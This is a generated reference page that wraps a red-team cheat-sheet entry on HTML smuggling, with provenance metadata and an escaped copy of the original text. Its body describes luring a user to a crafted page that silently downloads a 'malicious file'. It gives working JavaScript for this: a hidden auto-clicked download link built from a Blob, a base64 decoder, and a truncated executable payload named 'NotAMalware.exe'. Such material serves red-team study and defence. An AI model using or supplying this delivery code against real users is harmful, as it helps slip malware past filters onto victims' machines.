---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# HTML Smuggling

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-html-smuggling` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/html-smuggling.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

- Description

## Preserved Body

````markdown
## Description

HTML Smuggling consists of making a user to navigate to our crafted HTML page which automaticaly download our malicious file.

## Executable storage

We can store our payload in a Blob object => JS: `var blob = new Blob([data], {type: 'octet/stream'});`
To perform the download, we need to create an Object Url => JS: `var url = window.URL.createObjectURL(blob);`
With those two elements, we can create with Javascript our \<a> tag which will be used to download our malicious file:

```Javascript
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

To store ou payload, we use base64 encoding:

```Javascript
function base64ToArrayBuffer(base64) {
 var binary_string = window.atob(base64);
 var len = binary_string.length;
 var bytes = new Uint8Array( len );
 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
 return bytes.buffer;
}
       
var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'NotAMalware.exe';
```
````

## Source Verification

[source record](../../sources/internalallthethings/html-smuggling.md)

## Evidence Excerpt

````text
_body: "# HTML Smuggling\n\n## Summary\n\n- [Description](#description)\n- [Executable Storage](#executable-storage)\n\n##\
\ Description\n\nHTML Smuggling consists of making a user to navigate to our crafted HTML page which automaticaly download\
\ our malicious file.\n\n## Executable storage\n\nWe can store our payload in a Blob object => JS: `var blob = new Blob([data],\
\ {type: 'octet/stream'});`\nTo perform the download, we need to create an Object Url => JS: `var url = window.URL.createObjectURL(blob);`\n\
With those two elements, we can create with Javascript our \\<a> tag which will be used to download our malicious file:\n\
\n```Javascript\nvar a = document.createElement('a');\ndocument.body.appendChild(a);\na.style = 'display: none';\nvar url\
\ = window.URL.createObjectURL(blob);\na.href = url;\na.download = fileName;\na.click();\nwindow.URL.revokeObjectURL(url);\n\
```\n\nTo store ou payload, we use base64 encoding:\n\n```Javascript\nfunction base64ToArrayBuffer(base64) {\n var binary_string\
````
